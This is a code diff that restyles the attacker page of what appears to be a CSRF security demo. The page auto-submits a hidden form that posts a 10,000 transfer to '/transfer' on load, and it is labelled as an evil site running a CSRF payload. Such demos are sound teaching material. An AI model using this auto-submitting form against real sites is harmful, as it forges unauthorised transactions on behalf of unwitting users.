@@ -1,30 +1,54 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <title>Attacker Site</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Site | SCEL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #0a0d13; color: #cbd5e1; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        .card-chaos { background: linear-gradient(135deg, #111827 0%, #0f1219 100%); border: 1px solid rgba(239, 68, 68, 0.3); box-shadow: 0 0 40px rgba(239, 68, 68, 0.1), inset 0 1px 0 rgba(239, 68, 68, 0.1); }
+        body::before { content: ''; position: fixed; inset: 0; background-image: radial-gradient(rgba(239, 68, 68, 0.05) 1px, transparent 1px); background-size: 30px 30px; pointer-events: none; z-index: -1; }
+        @keyframes pulse-fast { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .pulse-fast { animation: pulse-fast 1s ease-in-out infinite; }
+    </style>
 </head>
+<body class="selection:bg-red-500/30 min-h-screen flex items-center justify-center p-4">
 
-<body style="background:black;color:red;text-align:center;margin-top:100px;">
+    <div class="fixed inset-0 pointer-events-none z-[-1] overflow-hidden">
+        <div class="absolute top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-[50%] h-[50%] bg-red-600/[0.08] blur-[150px] rounded-full"></div>
+    </div>
 
-    <h1>⚠ Evil Website ⚠</h1>
+    <div class="card-chaos rounded-xl p-10 w-full max-w-md text-center">
+        
+        <div class="flex items-center justify-center mb-6">
+            <svg class="w-16 h-16 text-red-500 pulse-fast" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+        </div>
 
-    <p>Performing hidden transaction...</p>
+        <h1 class="text-2xl font-extrabold text-red-400 tracking-tight mb-3 uppercase">⚠ Evil Website ⚠</h1>
+        <p class="text-sm font-mono text-slate-400 mb-8">Performing hidden transaction...</p>
 
-    <form id="attack-form"
-          action="/transfer"
-          method="POST">
+        <!-- Hidden Attack Form -->
+        <form id="attack-form" action="/transfer" method="POST">
+            <input type="hidden" name="amount" value="10000">
+        </form>
 
-        <input type="hidden"
-               name="amount"
-               value="10000">
-
-    </form>
+        <div class="flex justify-center">
+            <div class="flex items-center gap-2 px-4 py-2 bg-red-500/10 border border-red-500/20 rounded-full text-xs font-mono text-red-400">
+                <svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                Executing CSRF Payload...
+            </div>
+        </div>
+    </div>
 
     <script>
-        document.getElementById("attack-form").submit();
+        // Slightly delay the submit for visual effect in the demo, or immediately submit
+        setTimeout(() => {
+            document.getElementById("attack-form").submit();
+        }, 500);
     </script>
 
 </body>
-
 </html>
